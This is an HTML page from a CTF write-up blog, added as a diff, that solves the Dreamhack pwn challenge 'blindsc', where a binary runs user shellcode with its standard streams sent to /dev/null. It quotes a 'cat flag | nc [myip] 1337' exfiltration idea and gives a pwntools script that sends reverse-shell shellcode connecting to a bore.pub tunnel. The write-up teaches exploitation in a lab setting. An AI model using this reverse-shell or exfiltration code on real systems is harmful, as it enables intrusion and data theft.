@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Dreamhack blindsc Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="Dreamhack, pwn">
+<meta name="description" content="Challenge overview
+주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+Identifying the vulnerabilities
+Ahh.. blindsc as in blind shellcode!
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rbx
+  __int64 v4; // rbx
+  __int64 v5; // rbx
+  __int64 v6; // rbx
+  __int64 v7; // rbx
+  __int64 v8; // rbx
+  __int64 v9; // rbx
+  __int64 v10; // rbx
+  __int64 v11; // rbx
+  __int64 v12; // rbx
+  __int64 v13; // rbx
+  __int64 v14; // rbx
+  __int64 v15; // rbx
+  __int64 v16; // rbx
+  __int64 v17; // rbx
+  __int64 v18; // rbx
+  int fd; // [rsp&#43;24h] [rbp-1Ch]
+  void (*v21)(void); // [rsp&#43;28h] [rbp-18h]
+
+  setup();
+  printf(&#34;Input shellcode: &#34;);
+  read(0, &amp;buf, 0x100u);
+  v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0);
+  v3 = qword_4068;
+  *(_QWORD *)v21 = buf;
+  [...]
+  v17 = qword_4148;
+  *((_QWORD *)v21 &#43; 28) = qword_4140;
+  *((_QWORD *)v21 &#43; 29) = v17;
+  v18 = qword_4158;
+  *((_QWORD *)v21 &#43; 30) = qword_4150;
+  *((_QWORD *)v21 &#43; 31) = v18;
+  puts(&#34;\nNot gonna show you the result!&#34;);
+  fd = open(&#34;/dev/null&#34;, 2);
+  dup2(fd, 0);
+  dup2(fd, 1);
+  dup2(fd, 2);
+  v21();
+  return 0;
+}
+What I didn&rsquo;t recognize here was this dup2 function. From the geeks4geeks page:">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/blindsc-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.0104eb9d8f72dfc23e72924f1f282ad928b9467519160af39d6ea2ca5ea692a4.css" integrity="sha256-AQTrnY9y38I&#43;cpJPHygq2Si5RnUZFgrznW6iyl6mkqQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/blindsc-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/blindsc-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="Dreamhack blindsc Writeup">
+  <meta property="og:description" content="Challenge overview 주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.
+플래그의 형식은 DH{…} 입니다.
+Identifying the vulnerabilities Ahh.. blindsc as in blind shellcode!
+int __fastcall main(int argc, const char **argv, const char **envp) { __int64 v3; // rbx __int64 v4; // rbx __int64 v5; // rbx __int64 v6; // rbx __int64 v7; // rbx __int64 v8; // rbx __int64 v9; // rbx __int64 v10; // rbx __int64 v11; // rbx __int64 v12; // rbx __int64 v13; // rbx __int64 v14; // rbx __int64 v15; // rbx __int64 v16; // rbx __int64 v17; // rbx __int64 v18; // rbx int fd; // [rsp&#43;24h] [rbp-1Ch] void (*v21)(void); // [rsp&#43;28h] [rbp-18h] setup(); printf(&#34;Input shellcode: &#34;); read(0, &amp;buf, 0x100u); v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0); v3 = qword_4068; *(_QWORD *)v21 = buf; [...] v17 = qword_4148; *((_QWORD *)v21 &#43; 28) = qword_4140; *((_QWORD *)v21 &#43; 29) = v17; v18 = qword_4158; *((_QWORD *)v21 &#43; 30) = qword_4150; *((_QWORD *)v21 &#43; 31) = v18; puts(&#34;\nNot gonna show you the result!&#34;); fd = open(&#34;/dev/null&#34;, 2); dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); v21(); return 0; } What I didn’t recognize here was this dup2 function. From the geeks4geeks page:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-09T00:00:00+00:00">
+    <meta property="article:tag" content="Dreamhack">
+    <meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dreamhack blindsc Writeup">
+<meta name="twitter:description" content="Challenge overview
+주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.
+플래그의 형식은 DH{&hellip;} 입니다.
+Identifying the vulnerabilities
+Ahh.. blindsc as in blind shellcode!
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rbx
+  __int64 v4; // rbx
+  __int64 v5; // rbx
+  __int64 v6; // rbx
+  __int64 v7; // rbx
+  __int64 v8; // rbx
+  __int64 v9; // rbx
+  __int64 v10; // rbx
+  __int64 v11; // rbx
+  __int64 v12; // rbx
+  __int64 v13; // rbx
+  __int64 v14; // rbx
+  __int64 v15; // rbx
+  __int64 v16; // rbx
+  __int64 v17; // rbx
+  __int64 v18; // rbx
+  int fd; // [rsp&#43;24h] [rbp-1Ch]
+  void (*v21)(void); // [rsp&#43;28h] [rbp-18h]
+
+  setup();
+  printf(&#34;Input shellcode: &#34;);
+  read(0, &amp;buf, 0x100u);
+  v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0);
+  v3 = qword_4068;
+  *(_QWORD *)v21 = buf;
+  [...]
+  v17 = qword_4148;
+  *((_QWORD *)v21 &#43; 28) = qword_4140;
+  *((_QWORD *)v21 &#43; 29) = v17;
+  v18 = qword_4158;
+  *((_QWORD *)v21 &#43; 30) = qword_4150;
+  *((_QWORD *)v21 &#43; 31) = v18;
+  puts(&#34;\nNot gonna show you the result!&#34;);
+  fd = open(&#34;/dev/null&#34;, 2);
+  dup2(fd, 0);
+  dup2(fd, 1);
+  dup2(fd, 2);
+  v21();
+  return 0;
+}
+What I didn&rsquo;t recognize here was this dup2 function. From the geeks4geeks page:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Dreamhack blindsc Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/blindsc-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Dreamhack blindsc Writeup",
+  "name": "Dreamhack blindsc Writeup",
+  "description": "Challenge overview 주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.\n플래그의 형식은 DH{\u0026hellip;} 입니다.\nIdentifying the vulnerabilities Ahh.. blindsc as in blind shellcode!\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v3; // rbx __int64 v4; // rbx __int64 v5; // rbx __int64 v6; // rbx __int64 v7; // rbx __int64 v8; // rbx __int64 v9; // rbx __int64 v10; // rbx __int64 v11; // rbx __int64 v12; // rbx __int64 v13; // rbx __int64 v14; // rbx __int64 v15; // rbx __int64 v16; // rbx __int64 v17; // rbx __int64 v18; // rbx int fd; // [rsp+24h] [rbp-1Ch] void (*v21)(void); // [rsp+28h] [rbp-18h] setup(); printf(\u0026#34;Input shellcode: \u0026#34;); read(0, \u0026amp;buf, 0x100u); v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0); v3 = qword_4068; *(_QWORD *)v21 = buf; [...] v17 = qword_4148; *((_QWORD *)v21 + 28) = qword_4140; *((_QWORD *)v21 + 29) = v17; v18 = qword_4158; *((_QWORD *)v21 + 30) = qword_4150; *((_QWORD *)v21 + 31) = v18; puts(\u0026#34;\\nNot gonna show you the result!\u0026#34;); fd = open(\u0026#34;/dev/null\u0026#34;, 2); dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); v21(); return 0; } What I didn\u0026rsquo;t recognize here was this dup2 function. From the geeks4geeks page:\n",
+  "keywords": [
+    "Dreamhack", "pwn"
+  ],
+  "articleBody": "Challenge overview 주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.\n플래그의 형식은 DH{…} 입니다.\nIdentifying the vulnerabilities Ahh.. blindsc as in blind shellcode!\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v3; // rbx __int64 v4; // rbx __int64 v5; // rbx __int64 v6; // rbx __int64 v7; // rbx __int64 v8; // rbx __int64 v9; // rbx __int64 v10; // rbx __int64 v11; // rbx __int64 v12; // rbx __int64 v13; // rbx __int64 v14; // rbx __int64 v15; // rbx __int64 v16; // rbx __int64 v17; // rbx __int64 v18; // rbx int fd; // [rsp+24h] [rbp-1Ch] void (*v21)(void); // [rsp+28h] [rbp-18h] setup(); printf(\"Input shellcode: \"); read(0, \u0026buf, 0x100u); v21 = (void (*)(void))mmap(0, 0x1000u, 7, 34, -1, 0); v3 = qword_4068; *(_QWORD *)v21 = buf; [...] v17 = qword_4148; *((_QWORD *)v21 + 28) = qword_4140; *((_QWORD *)v21 + 29) = v17; v18 = qword_4158; *((_QWORD *)v21 + 30) = qword_4150; *((_QWORD *)v21 + 31) = v18; puts(\"\\nNot gonna show you the result!\"); fd = open(\"/dev/null\", 2); dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); v21(); return 0; } What I didn’t recognize here was this dup2 function. From the geeks4geeks page:\nThe dup() system call creates a copy of a file descriptor.\nIt uses the lowest-numbered unused descriptor for the new descriptor.\nIf the copy is successfully created, then the original and copy file descriptors may be used interchangeably.\nThe dup2() system call is similar to dup() but the basic difference between them is that instead of using the lowest-numbered unused file descriptor, it uses the descriptor number specified by the user.\nSo before running our shellcode, this moves the stdin, stdout and stderr file descriptors to /dev/null. So this renders them unusable.\nMy first idea was to write the contents of flag into binary at offset 0x2020 (string) so its printed with puts, or somehow reopen stdin \u0026 stdout.\nThe second one was to create a reverse shell, but I didn’t know how to achieve this.\n0x555555557000 0x555555558000 r--p 1000 2000 blindsc 0x555555558000 0x555555559000 rw-p 1000 3000 blindsc So our offset sadly only has read permissions. And we can’t call mprotect and change it to rw, since PIE is enabled.\nI started looking on the internet and found this very inspiring:\nIf we can find the appropriate gadgets, maybe we could run execve with syscalls and run a command like cat flag | nc [myip] 1337 which would give us the flag. But I was unable to find any syscall gadgets, and this would be a very difficult operation to do with only syscalls\nSo, let’s focus on creating a reverse shell!\nLuckily for us, pwntools has a built-in function in shellcraft for this. All we need to do is open a tcp tunnel on our machine, and connect them to it.\nThis made me write this post about tunneling for situations like this, so go ahead and look over that if you will.\nI quickly spun up a bore tunnel, and a listener on port 1337. Now, let’s finish the script and grab the flag!\nThe exploit from pwn import * #elf = ELF(\"./blindsc\") #p = elf.process() p = remote(\"host8.dreamhack.games\", 17211) context.arch = \"amd64\" context.os = \"linux\" shellcode = shellcraft.connect('bore.pub', 33843) shellcode += shellcraft.findpeersh() p.readuntil(b': ') p.sendline(asm(shellcode)) As always, the full code can be found on my GitHub here.\n",
+  "wordCount" : "557",
+  "inLanguage": "en",
+  "datePublished": "2026-05-09T00:00:00Z",
+  "dateModified": "2026-05-09T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/blindsc-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">
+                <img src="/writeup-blog/images/sakura.png" alt="" aria-label="logo"
+                     style="vertical-align:middle; margin-right:8px; display:inline-block;">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Dreamhack blindsc Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-05-09 00:00:00 +0000 UTC'>May 9, 2026</span>&nbsp;·&nbsp;<span>3 min</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
+                <li>
+                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>주어진 바이너리를 분석하여 익스플로잇하고 플래그를 획득하세요! 플래그는 flag 파일에 있습니다.</p>
+<p>플래그의 형식은 DH{&hellip;} 입니다.</p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>Ahh.. <code>blindsc</code> as in blind shellcode!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v9; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v11; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v12; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v13; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v14; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v15; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v16; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v17; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v18; <span style="color:#75715e">// rbx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> fd; <span style="color:#75715e">// [rsp+24h] [rbp-1Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>v21)(<span style="color:#66d9ef">void</span>); <span style="color:#75715e">// [rsp+28h] [rbp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Input shellcode: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x100u</span>);
+</span></span><span style="display:flex;"><span>  v21 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))<span style="color:#a6e22e">mmap</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000u</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">34</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> qword_4068;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)v21 <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>  [...]
+</span></span><span style="display:flex;"><span>  v17 <span style="color:#f92672">=</span> qword_4148;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)v21 <span style="color:#f92672">+</span> <span style="color:#ae81ff">28</span>) <span style="color:#f92672">=</span> qword_4140;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)v21 <span style="color:#f92672">+</span> <span style="color:#ae81ff">29</span>) <span style="color:#f92672">=</span> v17;
+</span></span><span style="display:flex;"><span>  v18 <span style="color:#f92672">=</span> qword_4158;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)v21 <span style="color:#f92672">+</span> <span style="color:#ae81ff">30</span>) <span style="color:#f92672">=</span> qword_4150;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)v21 <span style="color:#f92672">+</span> <span style="color:#ae81ff">31</span>) <span style="color:#f92672">=</span> v18;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Not gonna show you the result!&#34;</span>);
+</span></span><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/null&#34;</span>, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dup2</span>(fd, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dup2</span>(fd, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">dup2</span>(fd, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v21</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>What I didn&rsquo;t recognize here was this <code>dup2</code> function. From the <a href="https://www.geeksforgeeks.org/c/dup-dup2-linux-system-call/">geeks4geeks</a> page:</p>
+<blockquote>
+<p>The dup() system call creates a copy of a file descriptor.</p>
+<p>It uses the lowest-numbered unused descriptor for the new descriptor.</p>
+<p>If the copy is successfully created, then the original and copy file descriptors may be used interchangeably.</p>
+<p>The dup2() system call is similar to dup() but the basic difference between them is that instead of using the lowest-numbered unused file descriptor, it uses the descriptor number specified by the user.</p></blockquote>
+<p>So before running our shellcode, this moves the <code>stdin</code>, <code>stdout</code> and <code>stderr</code> file descriptors to <code>/dev/null</code>. So this renders them unusable.</p>
+<p>My first idea was to write the contents of flag into binary at offset <code>0x2020</code> (string) so its printed with <code>puts</code>, or somehow reopen stdin &amp; stdout.</p>
+<p>The second one was to create a reverse shell, but I didn&rsquo;t know how to achieve this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x555555557000     0x555555558000 r--p     <span style="color:#ae81ff">1000</span>    <span style="color:#ae81ff">2000</span> blindsc
+</span></span><span style="display:flex;"><span>0x555555558000     0x555555559000 rw-p     <span style="color:#ae81ff">1000</span>    <span style="color:#ae81ff">3000</span> blindsc
+</span></span></code></pre></div><p>So our offset sadly only has read permissions. And we can&rsquo;t call <code>mprotect</code> and change it to <code>rw</code>, since PIE is enabled.</p>
+<p>I started looking on the internet and found <a href="https://idiot.sg/blog/tokyowesterns-ctf-2018-load-pwn/">this very inspiring</a>:</p>
+<blockquote>
+<p>If we can find the appropriate gadgets, maybe we could run execve with syscalls and run a command like <code>cat flag | nc [myip] 1337</code> which would give us the flag. But I was unable to find any syscall gadgets, and this would be a very difficult operation to do with only syscalls</p></blockquote>
+<p>So, let&rsquo;s focus on creating a reverse shell!</p>
+<hr>
+<p>Luckily for us, <code>pwntools</code> has a built-in function in shellcraft for this. All we need to do is open a <code>tcp</code> tunnel on our machine, and connect them to it.</p>
+<p>This made me write <a href="https://irinasusca.github.io/writeup-blog/tunneling">this post</a> about tunneling for situations like this, so go ahead and look over that if you will.</p>
+<p>I quickly spun up a <code>bore</code> tunnel, and a listener on port 1337. Now, let&rsquo;s finish the script and grab the flag!</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/blindsc-writeup/flag.png#center"></p>
+<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#elf = ELF(&#34;./blindsc&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p = elf.process()</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;host8.dreamhack.games&#34;</span>, <span style="color:#ae81ff">17211</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;linux&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>connect(<span style="color:#e6db74">&#39;bore.pub&#39;</span>, <span style="color:#ae81ff">33843</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>findpeersh()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(asm(shellcode))
+</span></span></code></pre></div><hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/blindsc.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/dreamhack/">Dreamhack</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
